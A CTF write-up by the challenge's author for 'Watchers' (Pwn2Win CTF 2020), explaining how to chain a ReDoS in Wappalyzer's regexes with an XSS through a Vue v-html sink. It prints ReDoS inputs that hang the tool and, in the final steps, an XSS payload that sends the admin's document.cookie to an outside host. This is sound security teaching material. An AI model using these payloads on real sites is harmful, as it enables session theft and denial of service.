---
title: "Watchers - Pwn2Win CTF 2020"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["web", "xss", "csp-bypass", "exec", "wordpress", "redos", "regex", "headless-browser", "csp", "pwn2win-ctf", "pwn2win-ctf-2020", "2020", "ctf-writeup"]
summary: "Hi folks, this is a write up for my challenge in this year’s Pwn2Win edition, the environment docker is available at pwn2win repository, hope you enjoy!"
source:
  name: "CTFtime writeup #39696"
  url: "https://ctftime.org/writeup/39696"
original_source: "https://lemonslab.me/posts/watchers-writeup/"
ctf:
  name: "Pwn2Win CTF 2020"
  year: 2020
  challenge: "Watchers"
---

## Metadata

- **CTF:** Pwn2Win CTF 2020
- **Task:** Watchers
- **Author team:** Epic Leet Team
- **CTFtime:** <https://ctftime.org/writeup/39696>
- **Original writeup:** <https://lemonslab.me/posts/watchers-writeup/>

---
# Pwn2win 2020 Watchers: Write-Up

Wed, Jun 3, 2020

Hi folks, this is a write up for my challenge in this year’s Pwn2Win edition, the environment docker is available at [pwn2win repository](https://github.com/pwn2winctf/challenges-2020/tree/master/web-Watchers), hope you enjoy!

![Challenge](https://lemonslab.me/images/n9rjvmf.png)

**Description:** Welcome to Static Web Host! During all these years of static website development, Rebellious Fingers found out that the biggest hole in our security is the use of insecure third-party applications. To help our members mitigate this problem, and not be compromised by our enemies, we decided to implement a third-party app to help them identify which technologies their pages are running so they can check whether there is anything vulnerable before deployment.

**This challenge was only solved by[@PlaidCTF](https://twitter.com/PlaidCTF) and [@JustCatTheFish](https://twitter.com/justCatTheFish) (which wrote an [amazing writeup](https://github.com/justcatthefish/ctf-writeups/tree/master/2020-05-31-Pwn2win/web-watcher)). Congratulations!**

## Technical Overview

The objective here is to find and exploit a 0day in a tool called [Wappalyzer](https://github.com/AliasIO/wappalyzer) (version 6.0.2), which runs a lot of regex expressions against web pages to identify which technologies are running. As you can see [here](https://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags/1732454), regex isn’t the proper way to parse HTML leading to problems like the ones shown in this challenge.

With further analysis, this tool opens a web page (using puppeteer) and splits it into different groups. Such as: meta tags, HTML code, script tags, javascript variables, HTTP headers, etc. Then, each group is parsed by its group corresponding to the regular expression in source code, like the example:

```
    {
      "Vue.js": {
        "cats": [
          12
        ],
        "html": "<[^>]+\\sdata-v(?:ue)?-",
        "icon": "Vue.js.png",
        "js": {
          "Vue.version": "^(.+)$\\;version:\\1"
        },
        "script": [
          "vue[.-]([\\d.]*\\d)[^/]*\\.js\\;version:\\1",
          "(?:/([\\d.]+))?/vue(?:\\.min)?\\.js\\;version:\\1"
        ],
        "website": "https://vuejs.org"
      }
    }
```

Knowing this, we can see how easily we could trick this tool into detecting a **Vuejs** environment by just inserting the tag `<a data-v-pwn2win>` into our page:

![Vuejs being detected](https://lemonslab.me/images/kN0MNlq.png)

## Practical Overview

The challenge has three pages:

**Main:** This page is an HTML page editor that allows the user to change code from three different tabs: _home_ , _about_ , and _contact_. The user can change everything on the page except for a meta tag with _Content-Security-Policy_ setting the default source to none. There is also a weaponlyzer button that sends this page’s content to the server and displays the wappalyzer result after executing it in all these pages.  
**Check:** This page receives a same-origin URL as an argument and shows the wappalyzer result for the given address.  
**Bug report:** It is just a form saying that the admin will analyze the submitted URL with wappayzer through the check page.

It’s important to highlight some others concerns about the main page:

  1. We do have the code from weaponzyer button function
  2. Each tab accepts no more than 1500 chars, or it returns an error
  3. Refresh meta tag was filtered out (although there was an unintended bypass to it, exploitation wasn’t possible due to the resources load time limit I set in wappalyzer)
  4. There is no way to bypass the CSP directives


![](https://lemonslab.me/images/HChTHuQ.png)

## Solving the challenge

Now that we had a general overview of this challenge, we can start to think of how we can solve it.

The code provided shows that it will create a page for each tab in the index editor. Then, it will run every tab against the wappalyzer tool, display the results, and delete them. Except if the wappalyzer takes more than 20 seconds to run, then it will return an error with the page URL without deleting the file. As shown in the code bellow:

```
    <?php
    for($i = 0; $i < 3; $i++) {
        $output = shell_exec('timeout -k 3s 20s wappalyzer -w 8 ' . escapeshellarg(escapeshellcmd($targets[$i])));
        $json = json_decode($output, true);
    
        if (json_last_error() === JSON_ERROR_NONE) {
    
            unlink(realpath(substr(parse_url($targets[$i])["path"], 1)));
    
            foreach ($json['applications'] as $tech) {
    
                $entry = new class{};
    
                $entry->name = $tech["name"];
                $entry->version = $tech["version"];
    
                $category = array_values($tech["categories"])[0];
    
                if (!array_key_exists($category, $applications))
                    $applications[$category] = [];
    
                    if(!in_array($entry, $applications[$category], false))
                        array_push($applications[$category], $entry);
    
            } 
        } elseif ($output == '') {
            return 'Couldn\'t analyze your file, please ask the admin 
            to try weaponlyze in your page - URL: ' . substr(parse_url($targets[$i])["path"], 1);
        } else {
            unlink(realpath(substr(parse_url($targets[0])["path"], 1)));
            unlink(realpath(substr(parse_url($targets[1])["path"], 1)));
            unlink(realpath(substr(parse_url($targets[2])["path"], 1)));
        }
    
    }
```

Putting together that the code returns the page URL if wappalyzer takes too long to run, and a message saying “please ask the admin to try weaponlyze in your page”. It seems that we need to find a way to make a page take more than 20 seconds to be analyzed by wappalyzer to keep the file in the system.

This seems to mean that the admin will run the weaponlyzer function through our page. In contrast, bug report page displays the following message: Send your page to the admin so they can **recheck your page with weaponlyzer in /check** and look for any issues. In other words we can assume that the admin will take our URL and send it to the `/check` endpoint.

Looking into this endpoint, we can submit the default URL and see that this page does pretty much the same thing as the index, differing only by the fact that you need to submit an internal URL instead of uploading your content.

Based on this informations, we can say that we need to:

  1. Make wappalyzer takes more than 20 seconds analyzing our page to keep our file in the server
  2. Do something with the URL of our file to send it to the admin


To accomplish the first step, we need to go deeper into how the wappalyzer internals works: **regex processing**. By reading its source code, we can look for problematic regex structures where it’s possible to trigger a catastrophic regression. Cleaning the [regex file](https://github.com/AliasIO/wappalyzer/blob/master/src/apps.json) and running all regexes through a tool like [ReScue](ttps://github.com/2bdenny/ReScue) you should be able to find, at least, two different payloads that completely breaks wappalyzer:

```
    <meta name="GENERATOR" content="IMPERIA 46197946197946197946197946197946197946197946197946197946197946197946197946197946197946197946197946197966228761662296:"/>
    <script src='//c.c..j..c.c..j..c.c..j..c.c..j..c.c..j..c.c..j..c.c..j..c.c..j..jskhtlcnipmos.cdnjs.cdnjs.dnjs.cdnjs.cloudflar.jsjs.cloudf'></script>
```

(or more, as [@JustCatTheFish](https://twitter.com/justCatTheFish) describes a different payoad in their [writeup](https://github.com/justcatthefish/ctf-writeups/tree/master/2020-05-31-Pwn2win/web-watcher)).

Running weaponlyzer function with one of these two tags on our page, leads to the described error message with our home URL. Just as illustrated below:

![](https://lemonslab.me/images/ND1jM8o.png)

Okay, now that we can create files in the server, we have a URL to send to the bot, but we still don’t know what to do with it. To achieve this goal, let’s go back to the technical overview, where I point out that we can force some wappalyzer responses. In that example, I choose Vue to demonstrate my point, but let’s try something different now, using the **AMP Plugin** shown below:

```
    {
      "AMP Plugin": {
        "cats": [
          1,
          5
        ],
        "icon": "Accelerated-Mobile-Pages.svg",
        "implies": "WordPress",
        "meta": {
          "generator": "^AMP Plugin v(\\d+\\.\\d+.*)$\\;version:\\1"
        },
        "website": "https://amp-wp.org"
      },
    }
```

This version indicated in the regex means that it will be replaced by the first `\1` group in the wappalyzer response. Also, since the version is grouped by a `(\\d+\\.\\d+.*)`, it means that we can change the value to an arbitrary text using a special crafted meta tag:

```
    <meta name="GENERATOR" content="AMP Plugin v1.2.a my arbitrary text">
```

Resulting in:

![](https://lemonslab.me/images/BgmupTS.png)

We have a point of arbitrary text injection. It may be vulnerable to XSS, but trying to enter the value `<meta name="GENERATOR" content="AMP Plugin v1.2.a <svg/onload=alert(1)>">` didn’t work. Maybe this isn’t vulnerable to XSS? The answer is in the [VueJS .map file](https://github.com/pwn2winctf/challenges-2020/blob/master/web-Watchers/deploy/watchers/js/app.9c65c4c0.js.map), which isn’t deleted by default. Therefore we can easily retrieve the VueJS original code:

```
    <md-list v-for="(value, name) in weapon.data" v-bind:key="value">
        <md-list-item v-for="data in value" v-bind:key="data">{{data.name}}
            <code v-html="data.version"></code>
        </md-list-item>
    </md-list>
```

The presence of `v-html` show us that this is vulnerable according to [VueJS documentation](https://vuejs.org/v2/guide/security.html#Injecting-HTML). Wait, this is the exact statement that we control! So, yes, we have a vulnerable endpoint, which is good but still imposes us some restrictions:

  1. CSP won’t allow javascript execution, so the regexes applied in javascript by wappalyzer won’t work!
  2. Wappalyzer parses meta tags with the following regex: `/<meta[^>]+>/gi`, due to this behavior, the `<meta name="GENERATOR" content="AMP Plugin v1.2.a <img src=x onerror=alert(1)>">` tag won’t work, since the first > will be recognized as the meta tag ending.
  3. We cannot bypass the previous restriction by omitting the last `>`. Since VueJS uses innerHTML replacement, which happens after DOM loading, the page won’t understand it as code.
  4. `1.` and `2.` addresses all possible regexes with `(.*)` or `(.+)` groups for version substitution, so we need to find another way to do that. (Actually, a new release of wappalyzer one day before pwn2win introduced one new tag that fits this category without using javascript or meta tag, as shown in [JustCatTheFish writeup](https://github.com/justcatthefish/ctf-writeups/tree/master/2020-05-31-Pwn2win/web-watcher))


To bypass this problem, I looked for another way of matching strings, the `[^something]` (everything different from something). And I found a perfect match: `chartjs\\.org/dist/([\\d.]+(?:-[^/]+)?|master|latest)/Chart.*\\.js\\;version:\\1` in which the `(?:-[^/]+)` part of the subtitution group accepts all characteres different from a `/`, meaning I could exploit it using the following payload:

```
    <script src="data:chartjs.org/dist/45544-aaaaaaaaaaa<img src=x onerror='alert(1)'>/Chart.asdasdasdasdasd.js"></script>
```

![](https://lemonslab.me/images/7DINx6d.png)

## Put it all together

Now that we can create persistent files and trigger XSS, we just need to find a way to make the XSS payload execute before the ReDoS crashes wappalyzer. Fortunately, we have more than one page to edit! As soon as we receive the URL in the error message caused by the ReDoS crash, it is possible to notice that it comes in the format: `hash-home.html`, which we can just substitute to `hash-about.html` or `hash-contact.html`. We could put the ReDoS in the **home** page and the XSS in the **about** or **contact** page, then send the one that contains the XSS to the admin.

The steps to execute the attack described above are:

  1. Place in the home tab the ReDoS payload:


```
    <meta name="GENERATOR" content="IMPERIA 46197946197946197946197946197946197946197946197946197946197946197946197946197946197946197946197946197966228761662296:"/>
```

  2. Place in the about tab the XSS snippet:


```
    <script src="data:chartjs.org/dist/45544-aaaaaaaaaaa<img src=x onerror='location=`https:abrasax.club?${document.cookie}`'>/Chart.asdasdasdasdasd.js"></script>
```

  3. Click in wappalyzer button, wait 20 seconds to get the URL back.
  4. Send the XSS URL to the admin (`-about.html`)
  5. Get the flag: `CTF-BR{stackoverflow.com/revisions/1732454/11}`


## Considerations

  * The first consideration I had to do is that I had a lot of help from my teammates [@caioluders](https://twitter.com/caioluders) and [@lbherrera_](https://twitter.com/lbherrera_) during the process of development and tests for this challenge. The hard time we took to develop and test this challenge resulted in another wappalyzer 0day due to irresponsible use of zombiejs in their source code (which was surprisingly fixed just ONE DAY before the event). Thanks guys, I couldn’t do it without your help.
  * I want also to thank my university teacher and mentor [@thotypous](https://twitter.com/thotypous) who always makes the best effort to help me in infosec studying, and [@lorhansohaky](https://www.linkedin.com/in/lorhansohaky/) for answer all my inifine VueJS doubts :p
  * I hope you guys enjoyed this Pwn2Win edition, and that we see each other in the next one!
